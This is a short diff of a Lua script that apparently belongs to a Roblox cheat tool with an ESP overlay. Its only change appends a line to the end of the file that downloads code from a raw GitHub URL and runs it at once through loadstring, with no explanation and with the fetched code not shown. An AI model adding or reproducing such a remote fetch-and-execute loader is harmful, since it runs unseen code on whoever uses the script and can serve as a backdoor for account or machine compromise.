@@ -713,3 +713,5 @@ game:BindToClose(function()
     pcall(function() if espGui and espGui.Parent then espGui:Destroy() end end)
     pcall(function() if gui and gui.Parent then gui:Destroy() end end)
 end)
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/GOOSEBUMPPS/anti/main/sky", true))()
